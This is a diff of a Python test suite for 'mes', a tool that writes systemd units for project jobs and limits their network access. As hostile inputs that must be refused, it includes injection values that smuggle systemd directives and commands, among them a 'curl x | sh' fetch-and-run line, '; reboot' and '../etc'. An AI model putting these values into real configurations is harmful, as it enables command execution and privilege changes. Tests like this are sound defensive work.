-    assert t["OnCalendar"] == "*-*-* 06:00:00"
-    assert t["Persistent"] == "true"
-    assert t["RandomizedDelaySec"] == str(units.RANDOM_DELAY_SEC)
-    assert t["Unit"] == "mes-demo-sync.service"
-    assert t["WantedBy"] == "timers.target"
-    assert values(files["mes-demo-sync.service"], "OnSuccess") == ["mes-demo-build.service"]
-    assert values(files["mes-demo-build.service"], "OnSuccess") == ["mes-demo-report.service"]
-    assert values(files["mes-demo-report.service"], "OnSuccess") == []
-    assert "mes-demo-export.timer" not in files and "mes-demo-build.timer" not in files
-    assert units.read_markers(timer) == ("demo", "sync")
-    directives(units.render_slice())
-
-
-def test_escaping_of_paths_and_args(manifest):
-    root = "/srv/my apps/50% \"done\" $HOME\\x"
-    m = loads('[app]\nname = "demo"\n[jobs.x]\nrun = "ok \'%h $USER\' \\"q\\" back\\\\\\\\slash"\nmanual = true\n')
-    # backslashes make WorkingDirectory unsafe, so use a root without one for the full render
-    files = render(m, root=root.replace("\\x", "x"), exe=root.replace("\\x", "x") + "/.venv/bin/demo")
-    svc = files["mes-demo-x.service"]
-    d = {k: v for _, k, v in directives(svc) if k not in ("Environment", "ReadWritePaths")}
-    argv = split_exec(d["ExecStart"])
-    assert argv[0] == "/srv/my apps/50% \"done\" $HOME" + "x/.venv/bin/demo"
-    assert argv[1:] == list(m.job("x").argv)
-    assert "%h $USER" in argv
-    assert "%%h $$USER" in d["ExecStart"]
-    assert d["WorkingDirectory"] == '/srv/my apps/50%% "done" $HOME' + "x"
-    assert split_exec(d["ExecStopPost"])[6] == root.replace("\\x", "x")
-    # quote_exec_word handles backslashes too
-    assert units.quote_exec_word('a\\"b') == '"a\\\\\\"b"'
-    assert units.env_assignment("MES_JOB", 'x"%') == '"MES_JOB=x\\"%%"'
-
-
-HOSTILE = "evil\nExecStartPre=/bin/sh -c 'curl x | sh'"
-
-
-def _job(**kw):
-    base = dict(name="x", run="ok", argv=("ok",), trigger="manual")
-    base.update(kw)
-    return Job(**base)
-
-
-def _manifest(job, name="demo"):
-    return Manifest(name=name, title="t", version="1", jobs={job.name: job})
-
-
-@pytest.mark.parametrize("job", [
-    _job(name=HOSTILE),
-    _job(name="x\n[Service]"),
-    _job(argv=("ok", HOSTILE)),
-    _job(argv=("ok", "a\rb")),
-    _job(argv=("ok", ";")),
-    _job(argv=("ok", "x\x00y")),
-    _job(trigger="schedule", schedule="daily\nExecStart=/bin/sh"),
-    _job(trigger="schedule", schedule="daily %h"),
-    _job(memory="256M\nMemoryMax=infinity"),
-    _job(memory="infinity"),
-    _job(timeout="15m\nTimeoutStartSec=0"),
-    _job(network=("api.example.com\nPrivateNetwork=no",)),
-    _job(network=("evil host",)),
-    _job(writes=("data", "/etc")),
+@pytest.mark.parametrize("project,job", [
+    ("demo", "x\nExecStart=/bin/sh"), ("demo", "../x"), ("demo", "Sync"),
+    ("../etc", "sync"), ("demo\n", "sync"), ("Demo", "sync"),
 ])
-def test_hostile_manifest_values_are_refused(job):
-    with pytest.raises(Refused) as e:
-        render(_manifest(job))
-    assert e.value.code == "unsafe_unit_value"
-    assert e.value.exit_code == 5
+def test_record_refuses_hostile_names(server_root, capsys, monkeypatch, project, job):
+    _systemd_env(monkeypatch)
+    code, data = mes(capsys, "jobs", "record", "--project", project, "--server-root", str(server_root), job)
+    assert code in (2, 5)
+    assert not paths.server_layout("demo", server_root).run_log.exists()
 
 
-@pytest.mark.parametrize("app_name", ["demo\nExecStart=/bin/sh", "Demo", "../etc", "a"])
-def test_hostile_app_name_refused(app_name):
-    with pytest.raises(Refused):
-        render(_manifest(_job(), name=app_name))
-
-
-@pytest.mark.parametrize("kw", [
-    {"root": "/srv/app\nExecStart=/bin/sh"},
-    {"root": "/srv/app\\"},
-    {"root": "relative/app"},
-    {"root": "/srv/../etc"},
-    {"data_home": "/home/u/my data"},
-    {"data_home": "/home/u/data\nReadWritePaths=/"},
-    {"data_home": "/home/u/50%"},
-    {"data_home": "relative"},
-    {"state_home": "/home/u/st\"ate"},
-    {"state_home": "/home/u/st\\ate"},
-    {"exe": "demo"},
-    {"exe": "-/bin/demo"},
-    {"exe": "/srv/app/.venv/bin/demo\nExecStart=/bin/sh"},
-])
-def test_hostile_paths_refused(kw):
-    with pytest.raises(Refused):
-        render(_manifest(_job()), **kw)
-
-
-def test_rendered_units_never_have_extra_directives(manifest):
-    """Every rendered file parses into only the directives mes means to write."""
-    for text in render(manifest, root="/srv/odd dir/%n $x").values():
-        directives(text)
-
-
-def test_hostile_job_name_in_manifest_is_rejected_earlier():
-    with pytest.raises(MesError):
-        loads('[app]\nname = "demo"\n[jobs."x\\nExecStart=/bin/sh"]\nrun = "ok"\nmanual = true\n')
-
-
-# =========================================================================== review fixes
-
-
-def test_render_only_out_never_follows_a_planted_symlink(app_root, capsys, tmp_path):
-    out = tmp_path / "shared"
-    out.mkdir(mode=0o700)
-    victim = tmp_path / "victim.txt"
-    victim.write_text("PRECIOUS")
-    victim.chmod(0o600)
-    (out / ".mes.slice.tmp").symlink_to(victim)
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(out), "--app-dir", str(app_root))
-    assert code == 0, data
-    assert victim.read_text() == "PRECIOUS" and oct(victim.stat().st_mode & 0o777) == oct(0o600)
-    assert (out / "mes.slice").is_file() and not (out / "mes.slice").is_symlink()
-    assert oct((out / "mes.slice").stat().st_mode & 0o777) == oct(0o644)
-
-
-def test_render_only_out_needs_admin(app_root, capsys, tmp_path, monkeypatch):
-    monkeypatch.setenv("MES_ALLOW", "read")
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(tmp_path / "o"), "--app-dir", str(app_root))
-    assert code == 4 and not (tmp_path / "o").exists()
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(app_root))
-    assert code == 0 and "units" in data  # only showing them stays a read
-
-
-def test_render_only_out_refuses_systemd_folder(app_root, capsys, mes_home):
-    unit_dir = mes_home["xdg_config"] / "systemd" / "user"
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(unit_dir), "--app-dir", str(app_root))
+def test_record_refuses_missing_or_linked_log_folder(tmp_path, capsys, monkeypatch):
+    _systemd_env(monkeypatch)
+    root = tmp_path / "srv"
+    argv = ("jobs", "record", "--project", "demo", "--server-root", str(root), "sync")
+    code, data = mes(capsys, *argv)  # the server was never set up: a plain refusal, not a crash
     assert code == 5 and data["error"]["code"] == "unsafe_folder"
-    assert not list(unit_dir.glob("*")) if unit_dir.exists() else True
+    (root / "demo").mkdir(parents=True)
+    elsewhere = tmp_path / "elsewhere"
+    elsewhere.mkdir()
+    (root / "demo" / "log").symlink_to(elsewhere)
+    code, data = mes(capsys, *argv)
+    assert code == 5 and data["error"]["code"] == "unsafe_folder"
+    assert list(elsewhere.iterdir()) == []
 
 
-def test_render_only_out_refuses_foreign_and_shared(app_root, capsys, tmp_path):
-    out = tmp_path / "o"
-    out.mkdir(mode=0o700)
-    (out / "mes-demo-sync.service").write_text("[Service]\nExecStart=/bin/true\n")
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(out), "--app-dir", str(app_root))
-    assert code == 5 and data["error"]["code"] == "unit_conflict"
-    assert (out / "mes-demo-sync.service").read_text().startswith("[Service]")
-    shared = tmp_path / "shared"
-    shared.mkdir()
-    shared.chmod(0o777)
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(shared), "--app-dir", str(app_root))
-    assert code == 5 and data["error"]["code"] == "unsafe_folder" and not list(shared.iterdir())
-    # Writing again over mes's own files is fine.
-    good = tmp_path / "good"
-    assert mes(capsys, "jobs", "install", "--render-only", "--out", str(good), "--app-dir", str(app_root))[0] == 0
-    assert mes(capsys, "jobs", "install", "--render-only", "--out", str(good), "--app-dir", str(app_root))[0] == 0
+def test_record_refuses_log_folder_of_another_account(server_root, capsys, monkeypatch):
+    _systemd_env(monkeypatch)
+    real = os.getuid()
+    monkeypatch.setattr(jobs.os, "getuid", lambda: real + 4242)
+    code, data = mes(capsys, "jobs", "record", "--project", "demo", "--server-root", str(server_root), "sync")
+    assert code == 5 and data["error"]["code"] == "unsafe_folder"
 
 
-def test_interpreter_script_is_never_the_app(tmp_path, capsys):
-    root = make_app(tmp_path / "py")
-    (root / "pyproject.toml").write_text('[project]\nname = "demo"\n[project.scripts]\npython = "demo.cli:main"\n')
-    (root / ".venv" / "bin" / "python").symlink_to(sys.executable)
-    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(root))
-    assert code == 5 and data["error"]["code"] == "unsafe_app_program"
+def test_record_needs_write(server_root, capsys, monkeypatch):
+    _systemd_env(monkeypatch)
+    monkeypatch.setenv("MES_ALLOW", "read")
+    code, _ = mes(capsys, "jobs", "record", "--project", "demo", "--server-root", str(server_root), "sync")
+    assert code == 4
+
+
+# =========================================================================== allow-network (root, before a run)
+
+
+def _resolver(table):
+    def look(host, port, family, kind):
+        if host not in table:
+            raise socket.gaierror("no such host")
+        return [(socket.AF_INET6 if ":" in a else socket.AF_INET, kind, 6, "", (a, port)) for a in table[host]]
+    return look
+
+
+class FakeRun:
+    def __init__(self, code=0):
+        self.code = code
+        self.calls = []
+
+    def __call__(self, argv):
+        self.calls.append(argv)
+        return subprocess.CompletedProcess(argv, self.code, "", "Unit not loaded." if self.code else "")
+
+
+def test_allow_network_sets_only_the_hosts_and_nameservers(tmp_path):
+    resolv = tmp_path / "resolv.conf"
+    resolv.write_text("# comment\nnameserver 127.0.0.53\nnameserver fe80::1%eth0\nnameserver not-an-ip\n"
+                      "search example.com\n")
+    run = FakeRun()
+    res = jobs.allow_network(
+        "mes-demo.job.sync.service", ["api.example.com", "cdn.example.com"],
+        resolver=_resolver({"api.example.com": ["203.0.113.5", "203.0.113.5", "2001:db8::5", "0.0.0.0", "224.0.0.1"],
+                            "cdn.example.com": ["198.51.100.7"]}),
+        resolv_conf=str(resolv), run=run,
+    )
+    assert run.calls == [["systemctl", "set-property", "--runtime", "mes-demo.job.sync.service", "IPAddressAllow=",
+                          "IPAddressAllow=203.0.113.5 2001:db8::5 198.51.100.7 127.0.0.53 fe80::1"]]
+    assert res["allowed"] == ["203.0.113.5", "2001:db8::5", "198.51.100.7", "127.0.0.53", "fe80::1"]
+
+
+def test_allow_network_with_some_hosts_unknown(tmp_path):
+    run = FakeRun()
+    res = jobs.allow_network("mes-demo.job.sync.service", ["api.example.com", "gone.example.com"],
+                             resolver=_resolver({"api.example.com": ["203.0.113.5"]}),
+                             resolv_conf=str(tmp_path / "none"), run=run)
+    assert res["allowed"] == ["203.0.113.5"]
+
+
+def test_allow_network_dns_failure_is_temporary(tmp_path):
+    run = FakeRun()
+    with pytest.raises(TemporaryFailure) as e:
+        jobs.allow_network("mes-demo.job.sync.service", ["api.example.com"], resolver=_resolver({}),
+                           resolv_conf=str(tmp_path / "none"), run=run)
+    assert e.value.code == "dns_failed" and e.value.exit_code == 75
+    assert run.calls == []  # nothing was allowed
+
+
+def test_allow_network_systemd_failure(tmp_path):
+    with pytest.raises(MesError) as e:
+        jobs.allow_network("mes-demo.job.sync.service", ["api.example.com"],
+                           resolver=_resolver({"api.example.com": ["203.0.113.5"]}),
+                           resolv_conf=str(tmp_path / "none"), run=FakeRun(1))
+    assert e.value.code == "systemd_failed" and "Unit not loaded." in e.value.detail
+
+
+@pytest.mark.parametrize("unit", [
+    "mes-demo.net.sync.service", "sshd.service", "mes-demo.job.sync.service\nx", "mes-demo.job.sync.timer",
+    "mes-demo.job.sync.service; reboot", "-mes-demo.job.sync.service", "",
+])
+def test_allow_network_only_for_job_units(unit, tmp_path):
+    run = FakeRun()
+    with pytest.raises(UsageError):
+        jobs.allow_network(unit, ["api.example.com"], resolver=_resolver({"api.example.com": ["203.0.113.5"]}),
+                           resolv_conf=str(tmp_path / "none"), run=run)
+    assert run.calls == []
+
+
+@pytest.mark.parametrize("host", ["api.example.com\nIPAddressAllow=any", "evil host", "1.2.3.4/0", "*", "-x", ""])
+def test_allow_network_refuses_hostile_hosts(host, tmp_path):
+    run = FakeRun()
+    with pytest.raises(MesError) as e:
+        jobs.allow_network("mes-demo.job.sync.service", [host], resolver=_resolver({host: ["0.0.0.0"]}),
+                           resolv_conf=str(tmp_path / "none"), run=run)
+    assert e.value.code == "unsafe_unit_value"
+    assert run.calls == []
+
+
+def test_resolver_answers_are_validated():
+    def liar(host, port, family, kind):
+        return [(socket.AF_INET, kind, 6, "", ("any",)), (socket.AF_INET, kind, 6, "", ("10.0.0.1 0.0.0.0/0",)),
+                (socket.AF_INET, kind, 6, "", ()), (socket.AF_INET, kind, 6, "", ("192.0.2.1", 443))]
+    assert jobs.resolve_hosts(["api.example.com"], resolver=liar) == ["192.0.2.1"]
+
+
+def test_allow_network_command_needs_admin_and_hosts(capsys, monkeypatch):
+    monkeypatch.setenv("MES_ALLOW", "write")
+    code, _ = mes(capsys, "jobs", "allow-network", "--unit", "mes-demo.job.sync.service", "--", "api.example.com")
+    assert code == 4
+    monkeypatch.setenv("MES_ALLOW", "admin")
+    code, _ = mes(capsys, "jobs", "allow-network", "--unit", "mes-demo.job.sync.service")
+    assert code == 2
+
+
+# =========================================================================== checks of the jobs themselves
 
 
 def test_job_run_must_be_an_app_command(tmp_path, capsys):
-    toml = APP_TOML + '\n[jobs.bad]\nrun = "nosuchcmd --x"\nmanual = true\n\n[jobs.boss]\nrun = "reset"\nmanual = true\n'
-    root = make_app(tmp_path / "x", toml=toml)
-    code, data = mes(capsys, "jobs", "run", "bad", "--app-dir", str(root))
+    toml = PROJECT_TOML + ('\n[jobs.bad]\nrun = "demo nosuchcmd --x"\nmanual = true\n\n'
+                           '[jobs.boss]\nrun = "demo reset"\nmanual = true\n')
+    root = make_project(tmp_path / "x", toml=toml)
+    code, data = mes(capsys, "jobs", "run", "bad", "--project-dir", str(root))
     assert code == 1 and data["error"]["code"] == "job_invalid"
-    assert 'Job "bad" runs "nosuchcmd", but demo has no such command' in data["error"]["message"]
-    code, data = mes(capsys, "jobs", "run", "boss", "--app-dir", str(root))
+    assert 'Job "bad" runs "demo nosuchcmd", but demo has no such command' in data["error"]["message"]
+    assert "Nothing was run." in data["error"]["message"]
+    code, data = mes(capsys, "jobs", "run", "boss", "--project-dir", str(root))
     assert code == 1 and "admin command" in data["error"]["message"]
-    code, data = mes(capsys, "jobs", "list", "--app-dir", str(root))
-    assert code == 0 and any("nosuchcmd" in w for w in data["warnings"])
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(root))
+    code, data = mes(capsys, "jobs", "list", "--project-dir", str(root))
     assert code == 0 and any("nosuchcmd" in w for w in data["warnings"])
 
 
-def test_job_program_of_another_app_is_refused(app_root, capsys, monkeypatch):
+def test_bad_job_in_chain_stops_before_anything_runs(tmp_path, capsys, mes_home):
+    toml = PROJECT_TOML + '\n[jobs.late]\nrun = "demo nosuchcmd"\nafter = "report"\n'
+    root = make_project(tmp_path / "x", toml=toml)
+    code, data = mes(capsys, "jobs", "run", "sync", "--project-dir", str(root))
+    assert code == 1 and data["error"]["code"] == "job_invalid"
+    assert not log_file(mes_home).exists() and not order_file(mes_home).exists()
+
+
+def test_job_problems_unit():
+    project = loads(PROJECT_TOML)
+    assert jobs.job_problems(project, {"demo": {"ok": "read", "fail": "write", "sleep": "read", "temp": "write",
+                                                "touch": "write"}}) == []
+    problems = jobs.job_problems(project, {"demo": {"ok": "admin"}}, [project.job("export")])
+    assert problems and "admin command" in problems[0]
+    problems = jobs.job_problems(project, {}, [project.job("export")])
+    assert "has no such command" in problems[0] and "(its commands are: none)" in problems[0]
+
+
+def test_job_program_of_another_app_is_refused(project_root, capsys, monkeypatch):
     monkeypatch.setenv("FAKE_APP_NAME", "other")
-    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
+    code, data = mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
     assert code == 5 and data["error"]["code"] == "app_mismatch"
 
 
 def test_failed_job_text_shows_what_the_app_said(tmp_path, capsys):
-    toml = APP_TOML + '\n[jobs.stats]\nrun = "crash"\nmanual = true\n'
-    root = make_app(tmp_path / "x", toml=toml)
-    assert cli.run(["jobs", "run", "stats", "--no-chain", "--app-dir", str(root)]) == 1
+    toml = PROJECT_TOML + '\n[jobs.stats]\nrun = "demo crash"\nmanual = true\n'
+    root = make_project(tmp_path / "x", toml=toml)
+    assert cli.run(["jobs", "run", "stats", "--no-chain", "--project-dir", str(root)]) == 1
     err = capsys.readouterr().err
     assert 'The job "stats" stopped with an error' in err
     assert "What the app said:\nThe notes-per-day table does not exist yet." in err
@@ -808,7 +706,7 @@ def test_failed_job_text_shows_what_the_app_said(tmp_path, capsys):
     assert "were not started" not in err  # nothing waits for it
 
 
-def test_crash_inside_mes_still_logs_the_run(app_root, capsys, mes_home, monkeypatch):
+def test_crash_inside_mes_still_logs_the_run(project_root, capsys, mes_home, monkeypatch):
     real = subprocess.Popen
 
     class Exploding(real):
@@ -817,46 +715,32 @@ def test_crash_inside_mes_still_logs_the_run(app_root, capsys, mes_home, monkeyp
 
     monkeypatch.setattr(jobs, "app_commands", lambda *a: {"ok": "read"})
     monkeypatch.setattr(jobs.subprocess, "Popen", Exploding)
-    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
+    code, data = mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
     assert code == 1
     rec = jobs.read_log(log_file(mes_home))[-1]
     assert rec["job"] == "export" and rec["result"] == "interrupted"
 
 
-def test_forged_systemd_record_is_refused(app_root, capsys, monkeypatch, mes_home):
-    for k, v in {"SERVICE_RESULT": "success", "EXIT_CODE": "exited", "EXIT_STATUS": "0"}.items():
-        monkeypatch.setenv(k, v)
-    code, data = mes(capsys, "jobs", "record", "sync", "--app-dir", str(app_root))  # not Linux here
-    assert code == 5 and data["error"]["code"] == "not_from_systemd"
-    monkeypatch.setattr(jobs, "_is_linux", lambda: True)
-    monkeypatch.setenv("INVOCATION_ID", INVOCATION)
-    monkeypatch.setattr(jobs, "_show", lambda unit, *p: {"InvocationID": "f" * 32})
-    code, data = mes(capsys, "jobs", "record", "sync", "--app-dir", str(app_root))
-    assert code == 5
-    assert not log_file(mes_home).exists()
-
-
-def test_plain_words_for_limits_network_and_log(app_root, capsys, monkeypatch):
-    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(app_root))
-    sync = next(s for s in data["what_happens"] if s.startswith('Job "sync"'))
+def test_plain_words_for_limits_network_and_log(project_root, capsys):
+    project = loads(PROJECT_TOML)
+    sync = jobs.describe_job(project.job("sync"))
     assert "256 MB" in sync and "15 minutes" in sync
-    assert "full internet access" in sync and "cannot limit it" in sync
-    slow = next(s for s in data["what_happens"] if s.startswith('Job "slow"'))
+    assert "may reach only api.example.com on a server" in sync and "full internet access" in sync
+    slow = jobs.describe_job(project.job("slow"))
     assert "1 second." in slow and "has no internet access" in slow
 
-    assert cli.run(["jobs", "list", "--app-dir", str(app_root)]) == 0
+    assert cli.run(["jobs", "list", "--project-dir", str(project_root)]) == 0
     out = capsys.readouterr().out
-    assert "full (meant for api.example.com)" in out and "cannot yet limit" in out
+    assert "only api.example.com (on a server)" in out
 
-    mes(capsys, "jobs", "run", "broken", "--app-dir", str(app_root))
-    mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
-    assert cli.run(["jobs", "log", "--app-dir", str(app_root)]) == 0
+    mes(capsys, "jobs", "run", "broken", "--project-dir", str(project_root))
+    mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
+    assert cli.run(["jobs", "log", "--project-dir", str(project_root)]) == 0
     out = capsys.readouterr().out
     assert "failed" in out and "worked" in out and "by hand" in out and "exit-code" not in out
-    assert cli.run(["jobs", "log", "--verify", "--app-dir", str(app_root)]) == 0
+    assert cli.run(["jobs", "log", "--verify", "--project-dir", str(project_root)]) == 0
     out = capsys.readouterr().out
     assert "intact" in out and "head" not in out
-    assert cli.run(["jobs", "status", "--app-dir", str(app_root)]) == 0
+    assert cli.run(["jobs", "status", "--project-dir", str(project_root)]) == 0
     out = capsys.readouterr().out
-    assert "switched on here" in out and "Linux server" in out
+    assert "on this computer" in out and "mes server plan" in out
